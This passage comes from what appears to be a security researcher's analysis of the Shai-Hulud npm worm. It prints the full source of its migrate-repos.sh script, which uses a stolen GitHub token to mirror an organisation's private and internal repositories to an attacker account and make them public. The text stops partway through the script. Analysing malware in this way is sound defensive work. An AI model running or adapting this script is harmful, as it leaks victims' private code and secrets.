</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="o">[</span> -n <span class="s2">&#34;</span><span class="nv">$FILE_ERROR</span><span class="s2">&#34;</span> <span class="o">]</span> <span class="o">&amp;&amp;</span> <span class="o">[[</span> <span class="s2">&#34;</span><span class="nv">$FILE_ERROR</span><span class="s2">&#34;</span> !<span class="o">=</span> <span class="s2">&#34;null&#34;</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">[[</span> <span class="s2">&#34;</span><span class="nv">$FILE_ERROR</span><span class="s2">&#34;</span> <span class="o">==</span> *<span class="s2">&#34;already exists&#34;</span>* <span class="o">]]</span><span class="p">;</span> <span class="k">then</span>
</span></span><span class="line"><span class="cl">            <span class="nb">echo</span> -e <span class="s2">&#34;  </span><span class="si">${</span><span class="nv">YELLOW</span><span class="si">}</span><span class="s2">⚠ File already exists on branch</span><span class="si">${</span><span class="nv">NC</span><span class="si">}</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span>
</span></span><span class="line"><span class="cl">            <span class="nb">echo</span> -e <span class="s2">&#34;  </span><span class="si">${</span><span class="nv">RED</span><span class="si">}</span><span class="s2">❌ Failed to upload file: </span><span class="nv">$FILE_ERROR</span><span class="si">${</span><span class="nv">NC</span><span class="si">}</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="k">fi</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span>
</span></span><span class="line"><span class="cl">        <span class="nb">echo</span> -e <span class="s2">&#34;  </span><span class="si">${</span><span class="nv">GREEN</span><span class="si">}</span><span class="s2">✓ File uploaded successfully</span><span class="si">${</span><span class="nv">NC</span><span class="si">}</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="k">fi</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nb">echo</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl"><span class="k">done</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">echo</span> -e <span class="s2">&#34;</span><span class="si">${</span><span class="nv">GREEN</span><span class="si">}</span><span class="s2">🎉 Script execution completed!</span><span class="si">${</span><span class="nv">NC</span><span class="si">}</span><span class="s2">&#34;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h6 id="migrate-repossh">migrate-repos.sh</h6>
<p>The migrate-repos.sh script begins by enumerating the user&rsquo;s internal and private repositories.</p>
<img src="/static/NPM/image-7.png" alt="drawing" width="1000"/>
<p>It then processes each repository, appending the suffix -migration to its original name. It creates a new public repository with this new name and the description &ldquo;Shai-Hulud Migration&rdquo;.</p>
<img src="/static/NPM/image-8.png" alt="drawing" width="1000"/>
<img src="/static/NPM/image-13.png" alt="drawing" width="1000"/>
<p>The core function, migrate_repo, performs the following actions to duplicate each repository:</p>
<ul>
<li>It uses git clone &ndash;mirror to create a full copy of the repository.</li>
<li>It changes the remote URL to point to the newly created target repository using the command git remote set-url origin.</li>
<li>It pushes all content to the new mirror with git push &ndash;mirror.</li>
<li>Finally, it cleans up by removing the temporary local directory with rm -rf &ldquo;$repo_dir/$migration_name&rdquo;.</li>
</ul>
<img src="/static/NPM/image-12.png" alt="drawing" width="1000"/>
<p>To make the repository public it only changes the field private to &ldquo;false&rdquo;</p>
<img src="/static/NPM/image-11.png" alt="drawing" width="1000"/>
<img src="/static/NPM/image-10.png" alt="drawing" width="1000"/>
<p>This behavior can be seen in some users repositories:</p>
<img src="/static/NPM/work.png" alt="drawing" width="1000"/>
<p>Full code:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span><span class="lnt">135
</span><span class="lnt">136
</span><span class="lnt">137
</span><span class="lnt">138
</span><span class="lnt">139
</span><span class="lnt">140
</span><span class="lnt">141
</span><span class="lnt">142
</span><span class="lnt">143
</span><span class="lnt">144
</span><span class="lnt">145
</span><span class="lnt">146
</span><span class="lnt">147
</span><span class="lnt">148
</span><span class="lnt">149
</span><span class="lnt">150
</span><span class="lnt">151
</span><span class="lnt">152
</span><span class="lnt">153
</span><span class="lnt">154
</span><span class="lnt">155
</span><span class="lnt">156
</span><span class="lnt">157
</span><span class="lnt">158
</span><span class="lnt">159
</span><span class="lnt">160
</span><span class="lnt">161
</span><span class="lnt">162
</span><span class="lnt">163
</span><span class="lnt">164
</span><span class="lnt">165
</span><span class="lnt">166
</span><span class="lnt">167
</span><span class="lnt">168
</span><span class="lnt">169
</span><span class="lnt">170
</span><span class="lnt">171
</span><span class="lnt">172
</span><span class="lnt">173
</span><span class="lnt">174
</span><span class="lnt">175
</span><span class="lnt">176
</span><span class="lnt">177
</span><span class="lnt">178
</span><span class="lnt">179
</span><span class="lnt">180
</span><span class="lnt">181
</span><span class="lnt">182
</span><span class="lnt">183
</span><span class="lnt">184
</span><span class="lnt">185
</span><span class="lnt">186
</span><span class="lnt">187
</span><span class="lnt">188
</span><span class="lnt">189
</span><span class="lnt">190
</span><span class="lnt">191
</span><span class="lnt">192
</span><span class="lnt">193
</span><span class="lnt">194
</span><span class="lnt">195
</span><span class="lnt">196
</span><span class="lnt">197
</span><span class="lnt">198
</span><span class="lnt">199
</span><span class="lnt">200
</span><span class="lnt">201
</span><span class="lnt">202
</span><span class="lnt">203
</span><span class="lnt">204
</span><span class="lnt">205
</span><span class="lnt">206
</span><span class="lnt">207
</span><span class="lnt">208
</span><span class="lnt">209
</span><span class="lnt">210
</span><span class="lnt">211
</span><span class="lnt">212
</span><span class="lnt">213
</span><span class="lnt">214
</span><span class="lnt">215
</span><span class="lnt">216
</span><span class="lnt">217
</span><span class="lnt">218
</span><span class="lnt">219
</span><span class="lnt">220
</span><span class="lnt">221
</span><span class="lnt">222
</span><span class="lnt">223
</span><span class="lnt">224
</span><span class="lnt">225
</span><span class="lnt">226
</span><span class="lnt">227
</span><span class="lnt">228
</span><span class="lnt">229
</span><span class="lnt">230
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="cp">#!/bin/bash
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="nv">SOURCE_ORG</span><span class="o">=</span><span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nv">TARGET_USER</span><span class="o">=</span><span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nv">GITHUB_TOKEN</span><span class="o">=</span><span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nv">PER_PAGE</span><span class="o">=</span><span class="m">100</span>
</span></span><span class="line"><span class="cl"><span class="nv">TEMP_DIR</span><span class="o">=</span><span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="o">[[</span> <span class="nv">$#</span> -lt <span class="m">3</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then</span>
</span></span><span class="line"><span class="cl">    <span class="nb">exit</span> <span class="m">1</span>
</span></span><span class="line"><span class="cl"><span class="k">fi</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">SOURCE_ORG</span><span class="o">=</span><span class="s2">&#34;</span><span class="nv">$1</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nv">TARGET_USER</span><span class="o">=</span><span class="s2">&#34;</span><span class="nv">$2</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nv">GITHUB_TOKEN</span><span class="o">=</span><span class="s2">&#34;</span><span class="nv">$3</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="o">[[</span> -z <span class="s2">&#34;</span><span class="nv">$SOURCE_ORG</span><span class="s2">&#34;</span> <span class="o">||</span> -z <span class="s2">&#34;</span><span class="nv">$TARGET_USER</span><span class="s2">&#34;</span> <span class="o">||</span> -z <span class="s2">&#34;</span><span class="nv">$GITHUB_TOKEN</span><span class="s2">&#34;</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then</span>
</span></span><span class="line"><span class="cl">    <span class="nb">echo</span> <span class="s2">&#34;All three arguments are required&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="nb">exit</span> <span class="m">1</span>
</span></span><span class="line"><span class="cl"><span class="k">fi</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">TEMP_DIR</span><span class="o">=</span><span class="s2">&#34;./temp</span><span class="nv">$TARGET_USER</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">mkdir -p <span class="s2">&#34;</span><span class="nv">$TEMP_DIR</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nv">TEMP_DIR</span><span class="o">=</span><span class="k">$(</span>realpath <span class="s2">&#34;</span><span class="nv">$TEMP_DIR</span><span class="s2">&#34;</span><span class="k">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">github_api<span class="o">()</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">    <span class="nb">local</span> <span class="nv">endpoint</span><span class="o">=</span><span class="s2">&#34;</span><span class="nv">$1</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="nb">local</span> <span class="nv">method</span><span class="o">=</span><span class="s2">&#34;</span><span class="si">${</span><span class="nv">2</span><span class="k">:-</span><span class="nv">GET</span><span class="si">}</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="nb">local</span> <span class="nv">data</span><span class="o">=</span><span class="s2">&#34;</span><span class="si">${</span><span class="nv">3</span><span class="k">:-</span><span class="si">}</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="nb">local</span> <span class="nv">curl_args</span><span class="o">=(</span><span class="s2">&#34;-s&#34;</span> <span class="s2">&#34;-w&#34;</span> <span class="s2">&#34;%{http_code}&#34;</span> <span class="s2">&#34;-H&#34;</span> <span class="s2">&#34;Authorization: token </span><span class="nv">$GITHUB_TOKEN</span><span class="s2">&#34;</span> <span class="s2">&#34;-H&#34;</span> <span class="s2">&#34;Accept: application/vnd.github.v3+json&#34;</span><span class="o">)</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="o">[[</span> <span class="s2">&#34;</span><span class="nv">$method</span><span class="s2">&#34;</span> !<span class="o">=</span> <span class="s2">&#34;GET&#34;</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then</span>
</span></span><span class="line"><span class="cl">        <span class="nv">curl_args</span><span class="o">+=(</span><span class="s2">&#34;-X&#34;</span> <span class="s2">&#34;</span><span class="nv">$method</span><span class="s2">&#34;</span><span class="o">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">fi</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="o">[[</span> -n <span class="s2">&#34;</span><span class="nv">$data</span><span class="s2">&#34;</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then</span>
</span></span><span class="line"><span class="cl">        <span class="nv">curl_args</span><span class="o">+=(</span><span class="s2">&#34;-H&#34;</span> <span class="s2">&#34;Content-Type: application/json&#34;</span> <span class="s2">&#34;-d&#34;</span> <span class="s2">&#34;</span><span class="nv">$data</span><span class="s2">&#34;</span><span class="o">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">fi</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    curl <span class="s2">&#34;</span><span class="si">${</span><span class="nv">curl_args</span><span class="p">[@]</span><span class="si">}</span><span class="s2">&#34;</span> <span class="s2">&#34;https://api.github.com</span><span class="nv">$endpoint</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">get_all_repos<span class="o">()</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">    <span class="nb">local</span> <span class="nv">org</span><span class="o">=</span><span class="s2">&#34;</span><span class="nv">$1</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="nb">local</span> <span class="nv">page</span><span class="o">=</span><span class="m">1</span>
</span></span><span class="line"><span class="cl">    <span class="nb">local</span> <span class="nv">all_slugs</span><span class="o">=</span><span class="s2">&#34;[]&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">while</span> true<span class="p">;</span> <span class="k">do</span>
</span></span><span class="line"><span class="cl">        <span class="nb">local</span> response
</span></span><span class="line"><span class="cl">        <span class="nv">response</span><span class="o">=</span><span class="k">$(</span>github_api <span class="s2">&#34;/orgs/</span><span class="nv">$org</span><span class="s2">/repos?type=private,internal&amp;per_page=</span><span class="nv">$PER_PAGE</span><span class="s2">&amp;page=</span><span class="nv">$page</span><span class="s2">&#34;</span><span class="k">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nb">local</span> <span class="nv">http_code</span><span class="o">=</span><span class="s2">&#34;</span><span class="si">${</span><span class="nv">response</span><span class="p">: -3</span><span class="si">}</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="nb">local</span> <span class="nv">body</span><span class="o">=</span><span class="s2">&#34;</span><span class="si">${</span><span class="nv">response</span><span class="p">%???</span><span class="si">}</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span> ! <span class="nb">echo</span> <span class="s2">&#34;</span><span class="nv">$body</span><span class="s2">&#34;</span> <span class="p">|</span> jq empty 2&gt;/dev/null<span class="p">;</span> <span class="k">then</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="m">1</span>
</span></span><span class="line"><span class="cl">        <span class="k">fi</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span> ! <span class="nb">echo</span> <span class="s2">&#34;</span><span class="nv">$body</span><span class="s2">&#34;</span> <span class="p">|</span> jq -e <span class="s1">&#39;type == &#34;array&#34;&#39;</span> &gt;/dev/null<span class="p">;</span> <span class="k">then</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="m">1</span>
</span></span><span class="line"><span class="cl">        <span class="k">fi</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nb">local</span> repos_count
</span></span><span class="line"><span class="cl">        <span class="nv">repos_count</span><span class="o">=</span><span class="k">$(</span><span class="nb">echo</span> <span class="s2">&#34;</span><span class="nv">$body</span><span class="s2">&#34;</span> <span class="p">|</span> jq length<span class="k">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">[[</span> <span class="s2">&#34;</span><span class="nv">$repos_count</span><span class="s2">&#34;</span> -eq <span class="m">0</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then</span>
</span></span><span class="line"><span class="cl">            <span class="nb">break</span>
</span></span><span class="line"><span class="cl">        <span class="k">fi</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nb">local</span> page_slugs
</span></span><span class="line"><span class="cl">        <span class="nv">page_slugs</span><span class="o">=</span><span class="k">$(</span><span class="nb">echo</span> <span class="s2">&#34;</span><span class="nv">$body</span><span class="s2">&#34;</span> <span class="p">|</span> jq <span class="s1">&#39;[.[] | select(.archived == false) | .full_name]&#39;</span><span class="k">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nv">all_slugs</span><span class="o">=</span><span class="k">$(</span><span class="nb">echo</span> <span class="s2">&#34;</span><span class="nv">$all_slugs</span><span class="s2">&#34;</span> <span class="s2">&#34;</span><span class="nv">$page_slugs</span><span class="s2">&#34;</span> <span class="p">|</span> jq -s <span class="s1">&#39;add&#39;</span><span class="k">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="o">((</span>page++<span class="o">))</span>
</span></span><span class="line"><span class="cl">    <span class="k">done</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nb">echo</span> <span class="s2">&#34;</span><span class="nv">$all_slugs</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">create_repo<span class="o">()</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">    <span class="nb">local</span> <span class="nv">repo_name</span><span class="o">=</span><span class="s2">&#34;</span><span class="nv">$1</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="nb">local</span> repo_data
</span></span><span class="line"><span class="cl">    <span class="nv">repo_data</span><span class="o">=</span><span class="k">$(</span>cat <span class="s">&lt;&lt;EOF
</span></span></span><span class="line"><span class="cl"><span class="s">{
</span></span></span><span class="line"><span class="cl"><span class="s">    &#34;name&#34;: &#34;$repo_name&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s">    &#34;description&#34;: &#34;Shai-Hulud Migration&#34;,
</span></span></span><span class="line"><span class="cl"><span class="s">    &#34;private&#34;: true,
</span></span></span><span class="line"><span class="cl"><span class="s">    &#34;has_issues&#34;: false,
</span></span></span><span class="line"><span class="cl"><span class="s">    &#34;has_projects&#34;: false,
</span></span></span><span class="line"><span class="cl"><span class="s">    &#34;has_wiki&#34;: false
</span></span></span><span class="line"><span class="cl"><span class="s">}
</span></span></span><span class="line"><span class="cl"><span class="s">EOF</span>
</span></span><span class="line"><span class="cl">    <span class="k">)</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="nb">local</span> response
</span></span><span class="line"><span class="cl">    <span class="nv">response</span><span class="o">=</span><span class="k">$(</span>github_api <span class="s2">&#34;/user/repos&#34;</span> <span class="s2">&#34;POST&#34;</span> <span class="s2">&#34;</span><span class="nv">$repo_data</span><span class="s2">&#34;</span><span class="k">)</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="nb">local</span> <span class="nv">http_code</span><span class="o">=</span><span class="s2">&#34;</span><span class="si">${</span><span class="nv">response</span><span class="p">: -3</span><span class="si">}</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="nb">local</span> <span class="nv">body</span><span class="o">=</span><span class="s2">&#34;</span><span class="si">${</span><span class="nv">response</span><span class="p">%???</span><span class="si">}</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="nb">echo</span> <span class="s2">&#34;</span><span class="nv">$body</span><span class="s2">&#34;</span> <span class="p">|</span> jq -e <span class="s1">&#39;.name&#39;</span> &gt;/dev/null 2&gt;<span class="p">&amp;</span>1<span class="p">;</span> <span class="k">then</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="m">0</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">[[</span> <span class="s2">&#34;</span><span class="nv">$http_code</span><span class="s2">&#34;</span> <span class="o">=</span>~ ^4<span class="o">[</span>0-9<span class="o">][</span>0-9<span class="o">]</span>$ <span class="o">]]</span> <span class="o">&amp;&amp;</span> <span class="nb">echo</span> <span class="s2">&#34;</span><span class="nv">$body</span><span class="s2">&#34;</span> <span class="p">|</span> grep -qi <span class="s2">&#34;secondary rate&#34;</span><span class="p">;</span> <span class="k">then</span>
</span></span><span class="line"><span class="cl">            sleep <span class="m">600</span>
</span></span><span class="line"><span class="cl">            
</span></span><span class="line"><span class="cl">            <span class="c1"># Retry the request</span>
</span></span><span class="line"><span class="cl">            <span class="nv">response</span><span class="o">=</span><span class="k">$(</span>github_api <span class="s2">&#34;/user/repos&#34;</span> <span class="s2">&#34;POST&#34;</span> <span class="s2">&#34;</span><span class="nv">$repo_data</span><span class="s2">&#34;</span><span class="k">)</span>
</span></span><span class="line"><span class="cl">            <span class="nv">http_code</span><span class="o">=</span><span class="s2">&#34;</span><span class="si">${</span><span class="nv">response</span><span class="p">: -3</span><span class="si">}</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">            <span class="nv">body</span><span class="o">=</span><span class="s2">&#34;</span><span class="si">${</span><span class="nv">response</span><span class="p">%???</span><span class="si">}</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">            
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="nb">echo</span> <span class="s2">&#34;</span><span class="nv">$body</span><span class="s2">&#34;</span> <span class="p">|</span> jq -e <span class="s1">&#39;.name&#39;</span> &gt;/dev/null 2&gt;<span class="p">&amp;</span>1<span class="p">;</span> <span class="k">then</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="m">0</span>
</span></span><span class="line"><span class="cl">            <span class="k">fi</span>
</span></span><span class="line"><span class="cl">        <span class="k">fi</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="m">1</span>
</span></span><span class="line"><span class="cl">    <span class="k">fi</span>
</span></span><span class="line"><span class="cl"><span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">make_repo_public<span class="o">()</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">    <span class="nb">local</span> <span class="nv">repo_name</span><span class="o">=</span><span class="s2">&#34;</span><span class="nv">$1</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="nb">local</span> repo_data
</span></span><span class="line"><span class="cl">    <span class="nv">repo_data</span><span class="o">=</span><span class="k">$(</span>cat <span class="s">&lt;&lt;EOF
</span></span></span><span class="line"><span class="cl"><span class="s">{
</span></span></span><span class="line"><span class="cl"><span class="s">    &#34;private&#34;: false
</span></span></span><span class="line"><span class="cl"><span class="s">}
</span></span></span><span class="line"><span class="cl"><span class="s">EOF</span>
</span></span><span class="line"><span class="cl">    <span class="k">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nb">local</span> response
</span></span><span class="line"><span class="cl">    <span class="nv">response</span><span class="o">=</span><span class="k">$(</span>github_api <span class="s2">&#34;/repos/</span><span class="nv">$TARGET_USER</span><span class="s2">/</span><span class="nv">$repo_name</span><span class="s2">&#34;</span> <span class="s2">&#34;PATCH&#34;</span> <span class="s2">&#34;</span><span class="nv">$repo_data</span><span class="s2">&#34;</span><span class="k">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nb">local</span> <span class="nv">http_code</span><span class="o">=</span><span class="s2">&#34;</span><span class="si">${</span><span class="nv">response</span><span class="p">: -3</span><span class="si">}</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="nb">local</span> <span class="nv">body</span><span class="o">=</span><span class="s2">&#34;</span><span class="si">${</span><span class="nv">response</span><span class="p">%???</span><span class="si">}</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="nb">echo</span> <span class="s2">&#34;</span><span class="nv">$body</span><span class="s2">&#34;</span> <span class="p">|</span> jq -e <span class="s1">&#39;.private == false&#39;</span> &gt;/dev/null 2&gt;<span class="p">&amp;</span>1<span class="p">;</span> <span class="k">then</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="m">0</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="m">1</span>
</span></span><span class="line"><span class="cl">    <span class="k">fi</span>
</span></span><span class="line"><span class="cl"><span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">migrate_repo<span class="o">()</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">    <span class="nb">local</span> <span class="nv">source_clone_url</span><span class="o">=</span><span class="s2">&#34;</span><span class="nv">$1</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="nb">local</span> <span class="nv">target_clone_url</span><span class="o">=</span><span class="s2">&#34;</span><span class="nv">$2</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="nb">local</span> <span class="nv">migration_name</span><span class="o">=</span><span class="s2">&#34;</span><span class="nv">$3</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="nb">local</span> <span class="nv">repo_dir</span><span class="o">=</span><span class="s2">&#34;</span><span class="nv">$TEMP_DIR</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> ! git clone --mirror <span class="s2">&#34;</span><span class="nv">$source_clone_url</span><span class="s2">&#34;</span> <span class="s2">&#34;</span><span class="nv">$repo_dir</span><span class="s2">/</span><span class="nv">$migration_name</span><span class="s2">&#34;</span> 2&gt;/dev/null<span class="p">;</span> <span class="k">then</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="m">1</span>
</span></span><span class="line"><span class="cl">    <span class="k">fi</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nb">cd</span> <span class="s2">&#34;</span><span class="nv">$repo_dir</span><span class="s2">/</span><span class="nv">$migration_name</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> ! git remote set-url origin <span class="s2">&#34;</span><span class="nv">$target_clone_url</span><span class="s2">&#34;</span> 2&gt;/dev/null<span class="p">;</span> <span class="k">then</span>
</span></span><span class="line"><span class="cl">        <span class="nb">cd</span> - &gt;/dev/null
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="m">1</span>
</span></span><span class="line"><span class="cl">    <span class="k">fi</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> ! git push --mirror 2&gt;/dev/null<span class="p">;</span> <span class="k">then</span>
</span></span><span class="line"><span class="cl">        <span class="nb">cd</span> - &gt;/dev/null
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="m">1</span>
</span></span><span class="line"><span class="cl">    <span class="k">fi</span>
